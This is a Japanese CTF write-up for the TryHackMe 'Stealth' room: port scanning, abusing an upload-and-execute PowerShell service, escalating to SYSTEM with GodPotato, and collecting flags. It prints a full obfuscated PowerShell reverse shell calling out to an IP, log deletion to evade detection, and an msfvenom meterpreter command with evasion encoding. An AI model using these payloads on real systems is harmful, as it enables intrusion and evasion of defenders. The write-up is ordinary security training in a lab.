# Stealth CTF

https://tryhackme.com/room/stealth

## Enumeration

```shell
TARGET=10.64.129.12
sudo bash -c "echo $TARGET   stealth.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT      STATE SERVICE       REASON
139/tcp   open  netbios-ssn   syn-ack ttl 128
445/tcp   open  microsoft-ds  syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5985/tcp  open  wsman         syn-ack ttl 128
7680/tcp  open  pando-pub     syn-ack ttl 128
8000/tcp  open  http-alt      syn-ack ttl 128
8080/tcp  open  http-proxy    syn-ack ttl 128
8443/tcp  open  https-alt     syn-ack ttl 128
47001/tcp open  winrm         syn-ack ttl 128
49664/tcp open  unknown       syn-ack ttl 128
49665/tcp open  unknown       syn-ack ttl 128
49666/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49668/tcp open  unknown       syn-ack ttl 128
49672/tcp open  unknown       syn-ack ttl 128
49680/tcp open  unknown       syn-ack ttl 128
```

```sh
sudo nmap -sV -p139,445,3389,5985,7680,8000,8080,8443,47001,49664,49665,49666,49667,49668,49672,49680 $TARGET

PORT      STATE    SERVICE       VERSION
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open     microsoft-ds?
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  filtered pando-pub
8000/tcp  open     http          PHP cli server 5.5 or later
8080/tcp  open     http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
8443/tcp  open     ssl/http      Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49672/tcp open     msrpc         Microsoft Windows RPC
49680/tcp open     msrpc         Microsoft Windows RPC
```

いろいろオープンしているが、8080ポートから始める。smbは匿名では何も出なかった。

## PowerShell Script Analyser

まず、動作を観察するために https://www.revshells.com/ の Powershell #1 の ps1 ファイルをアップロードしたらいきなりリバースシェルを取れた。

```sh
$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.131.69] from (UNKNOWN) [10.64.129.12] 49795
whoami
hostevasion\evader
```

デスクトップのencodedflagを表示

```sh
type encodedflag
-----BEGIN CERTIFICATE----- WW91IGNhbiBnZXQgdGhlIGZsY[REDACTED]-----END CERTIFICATE-----
```

デコードしたらPHPのパスが出てきた。

```sh
You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/[REDACTED].php
```

PHPにアクセスしたら、ブルーチームに検出されたから失敗というメッセージ。

```
Hey, seems like you have uploaded invalid file. Blue team has been alerted.
Hint: Maybe removing the logs files for file uploads can help?
```

言及されているのは log.txt のことと思われるが、削除したらどうなるのかは不明。

```
type "C:\xampp\htdocs\uploads\log.txt"
exe ps1  ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 txt ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1  ps1 ps1
```


C:\Users\evader\Documents\Task\file.ps1 で背後の処理が見えてくる。

- 1秒間隔のポーリングでアップロードされたps1ファイルを検出し、実行している。
- 実行される仕組みは理解したが、ブルーチームが検出している仕組みは不明のまま。

```ps
$FolderPath = "C:\xampp\htdocs\uploads\"
$FileDictionary = @{}

# 初期化
$Files = Get-ChildItem -Path $FolderPath -File
foreach ($file in $Files) {
    $FileDictionary[$file.Name] = $file.LastWriteTime
}

while ($true) {
    Start-Sleep -Seconds 1

    # 現在のファイル一覧を取得
    $Files = Get-ChildItem -Path $FolderPath -File

    foreach ($file in $Files) {
        $extension = $file.Extension.ToLower()
        if ($FileDictionary.ContainsKey($file.Name)) {
            # 既存ファイル：更新チェック
            if ($file.LastWriteTime -ne $FileDictionary[$file.Name]) {
                Write-Host "File $($file.Name) has been modified."
                $FileDictionary[$file.Name] = $file.LastWriteTime

                if ($extension -eq ".ps1") {
                    $scriptPath = Join-Path $FolderPath $file.Name
                    try {
                        Start-Job -ScriptBlock { param($p) powershell.exe -ExecutionPolicy Bypass -File $p } -ArgumentList $scriptPath
                    } catch {
                        Write-Host "An exception occurred: $($_.Exception.Message)"
                    }
                }
            }
        } else {
            # 新規ファイル
            Write-Host "File $($file.Name) has been added."
            $FileDictionary[$file.Name] = $file.LastWriteTime

            if ($extension -eq ".ps1") {
                $scriptPath = Join-Path $FolderPath $file.Name
                try {
                    Start-Job -ScriptBlock { param($p) powershell.exe -ExecutionPolicy Bypass -File $p } -ArgumentList $scriptPath
                } catch {
                    Write-Host "An exception occurred: $($_.Exception.Message)"
                }
            }
        }
    }

    # 削除されたファイルを検出して辞書から削除
    $deletedFiles = @()
    foreach ($fileName in $FileDictionary.Keys) {
        if (-not (Test-Path -Path (Join-Path $FolderPath $fileName))) {
            Write-Host "File $fileName has been deleted."
            $deletedFiles += $fileName
        }
    }

    foreach ($deletedFile in $deletedFiles) {
        $FileDictionary.Remove($deletedFile) | Out-Null
    }
}
```

```
type "C:\xampp\htdocs\uploads\log.txt"
exe ps1  ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 txt ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1 ps1  ps1 ps1
```

C:\xampp\htdocs\uploads\vulnerable.ps1。難読化されたps1ファイルが保存されていた。  
IP,ポートを書き換えてアップロードしてみたが無反応。よくわからない。

```ps
Set-Alias -Name K -Value Out-String Set-Alias -Name nothingHere -Value iex $BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"('10.10.129.75',1234); $replace = $BT.GetStream(); [byte[]]$B = 0..(32768*2-1)|%{0}; $B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n") $replace.Write($B,0,$B.Length) $B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>') $replace.Write($B,0,$B.Length) [byte[]]$int = 0..(10000+55535)|%{0}; while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){; $ROM = [text.encoding]::ASCII.GetString($int,0, $i); $I = (nothingHere $ROM 2>&1 | K ); $I2  = $I + (pwd).Path + '> '; $U = [text.encoding]::ASCII.GetBytes($I2); $replace.Write($U,0,$U.Length); $replace.Flush()}; $BT.Close()
```

VM再起動して最初のペイロードをアップロードしたが、何故かリバースシェルを取れなくなった。

revshells.com の `PHP Ivan Sincek` をホストからダウンロードするps1ファイルをアップロードすることで、http://stealth.thm:8080/shell.php からリバースシェルを取れた。

## 権限昇格

SeImpersonatePrivilege 権限を持っている。

```sh
$ nc -lnvp 8888
listening on [any] 8888 ...
connect to [192.168.131.69] from (UNKNOWN) [10.65.161.31] 49799
SOCKET: Shell has connected! PID: 1228
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

GodPotato.exe をアップロード。

```sh
C:\xampp\htdocs>potato.exe -cmd "cmd /c whoami"               
[*] CombaseModule: 0x140720472784896
[*] DispatchTable: 0x140720475102384
[*] UseProtseqFunction: 0x140720474479664
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\1f8eb7ed-99ad-4177-8a51-346edf27049e\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000bc02-1538-ffff-c2ca-d8096f964038
[*] DCOM obj OXID: 0xcaf3dcf0d7efb3ea
[*] DCOM obj OID: 0xd7a334344fe6dc7a
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 508 Token:0x628  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2560
```

Adminのデスクトップのフラグを入手。

```sh
C:\xampp\htdocs>potato.exe -cmd "cmd /c dir c:\Users\Administrator\Desktop" 
[*] CombaseModule: 0x140720472784896
[*] DispatchTable: 0x140720475102384
[*] UseProtseqFunction: 0x140720474479664
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\c65e8ddd-08e8-4eab-87f9-87f3f09dfc0b\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00009802-1774-ffff-5921-e25b2c1b2aa4
[*] DCOM obj OXID: 0x8a7a04b41f7e87c
[*] DCOM obj OID: 0x6521224731a016c3
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 508 Token:0x628  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 5452
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of c:\Users\Administrator\Desktop

09/04/2023  03:09 PM    <DIR>          .
09/04/2023  03:09 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
08/08/2023  03:46 PM    <DIR>          flag
07/29/2023  03:54 PM                24 flag.txt
09/04/2023  12:25 PM    <DIR>          Process Hacker 2
               3 File(s)          1,105 bytes
               4 Dir(s)  13,600,886,784 bytes free
```

まだユーザーフラグを入手していていない。

-> C:\xampp\htdocs\uploads\log.txt を削除してから、エンコードされていたPHPエンドポイントにアクセスしたらユーザーフラグが表示された。

## 振り返り

- VMの動作が不安定で、結局何を求められていたのかよく分からなかった。最初に何の工夫もないps1ファイルをアップロードしたらリバースシェルを取れたが、VM再起動したら同じファイルをアップロードしてもリバースシェルを取れなかったりと、不安定。
- log.txt を削除したらPHPのユーザーフラグが表示されるようになるというのも無意味だし理解し難い仕様。
- [ウォークスルー](https://sumanroy.gitbook.io/ctf-writeups/tryhackme-writeups/stealth-tryhackme-walkthrough-writeup)を見ると、検出を回避するために、msfvenomのエンコードが使われていた。

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f exe -o rev.exe -e x64/zutto_dekiru
```

## Tags

#tags:Windows #tags:Defender回避 #tags:potato
